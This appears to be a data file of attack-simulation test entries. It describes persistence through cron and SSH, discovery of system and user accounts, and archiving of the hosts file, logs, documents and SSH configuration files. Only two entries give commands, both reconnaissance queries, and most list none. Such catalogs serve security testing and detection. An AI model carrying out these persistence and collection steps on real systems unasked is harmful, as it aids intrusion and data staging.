attacks.description: Start the SSH service, demonstrating the creation or modification of a system process.
attacks.expected_behavior: The SSH service will start, allowing remote connections to the system.

attacks.description: Open the cron table for editing, allowing for the creation or modification of scheduled system processes.
attacks.expected_behavior: The default editor will open, allowing the user to add, modify, or delete cron jobs.

attacks.description: Apply the configurations in sysctl.conf, potentially modifying system process behaviors.
attacks.expected_behavior: The system will apply the configurations, which could affect network settings or other kernel parameters.

attacks.description: Collects comprehensive OS version, build, installed hotfixes, memory, and hardware details using the built‑in systeminfo utility.
attacks.expected_behavior: Outputs a formatted list of system information to the console, including OS name, version, system manufacturer, processor, and memory.

attacks.command: wmic os get Caption,Version,BuildNumber /format:list && wmic cpu get Name,NumberOfCores /format:list && wmic logicaldisk get DeviceID,Size,FreeSpace /format:list
attacks.description: Uses WMIC to query specific OS version, CPU model and core count, and logical disk identifiers with size and free space.
attacks.expected_behavior: Prints key/value pairs for the OS, CPU, and each logical disk, providing concise system inventory data.

attacks.command: powershell -Command "$env:COMPUTERNAME; $env:USERNAME; Get-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion' -Name ProductName,CurrentBuild,ReleaseId; Get-WmiObject -Class Win32_ComputerSystem | Select-Object Manufacturer,Model"
attacks.description: PowerShell command that extracts the computer name, current user, Windows product name and build from the registry, and hardware manufacturer/model via WMI.
attacks.expected_behavior: Outputs the hostname, username, Windows edition and build number, and the system manufacturer and model to the console.

attacks.description: Gather basic system information
attacks.expected_behavior: Displays system information including the kernel name, hostname, kernel version, and architecture.

attacks.description: Gather detailed operating system information
attacks.expected_behavior: Displays detailed information about the operating system, including the name, version, and ID.

attacks.description: Gather extensive system hardware information
attacks.expected_behavior: Displays detailed hardware information about the system, including the manufacturer, product name, and serial number.

attacks.description: Collects and archives the hosts file using PowerShell.
attacks.expected_behavior: Creates an archive of the hosts file in the temp directory.

attacks.description: Collects and archives the hosts file using makecab.
attacks.expected_behavior: Creates a cabinet archive of the hosts file in the temp directory.

attacks.description: Compresses all .txt files in the current user's Documents folder into a tar.gz archive stored in /tmp.
attacks.expected_behavior: Creates /tmp/data_archive.tar.gz containing the selected text files; no output on success.

attacks.description: Finds log files modified in the last 24 hours under /var/log, adds them to a tar archive, then compresses the archive with gzip.
attacks.expected_behavior: Generates /tmp/logs_YYYY-MM-DD.tar.gz containing recent log files; may require root to read some logs.

attacks.description: Archives selected SSH configuration files, compresses them on‑the‑fly, and encrypts the output with OpenSSL using a test password.
attacks.expected_behavior: Creates $HOME/ssh_config_archive.tar.gz.enc containing the encrypted archive of the SSH config files.

attacks.description: Open cron table for editing to schedule a new task
attacks.expected_behavior: Opens the cron table in the default editor, allowing the user to add a new scheduled task.

attacks.description: Schedule a script to run daily at midnight
attacks.expected_behavior: Appends a new cron job to the existing cron table, scheduling the specified script to run daily at midnight.

attacks.description: Open root's cron table for editing to schedule a task with elevated privileges
attacks.expected_behavior: Opens the root cron table in the default editor, allowing the user to add a new scheduled task with elevated privileges.

attacks.description: Lists all local user accounts on the system using the built‑in net.exe utility.
attacks.expected_behavior: The command outputs a list of local usernames, typically displayed in columns.

attacks.description: Enumerates domain user accounts when the host is joined to an Active Directory domain.
attacks.expected_behavior: The command returns a list of domain usernames; if the machine is not domain‑joined, it reports an error.

attacks.description: Uses PowerShell to query WMI for user account objects, retrieving name, domain, and SID for each account.
attacks.expected_behavior: Outputs a table with columns Name, Domain, and SID containing both local and domain accounts.

attacks.description: Enumerate all user accounts on the system using getent.
attacks.expected_behavior: Lists all user accounts on the system.

attacks.description: Use awk to filter the output of getent passwd and print only the usernames.
attacks.expected_behavior: Lists only the usernames from the passwd database.

attacks.description: Use grep to filter the output of getent passwd for a specific string, demonstrating how to search for particular accounts.
attacks.expected_behavior: Displays entries from the passwd database containing the string 'test'.
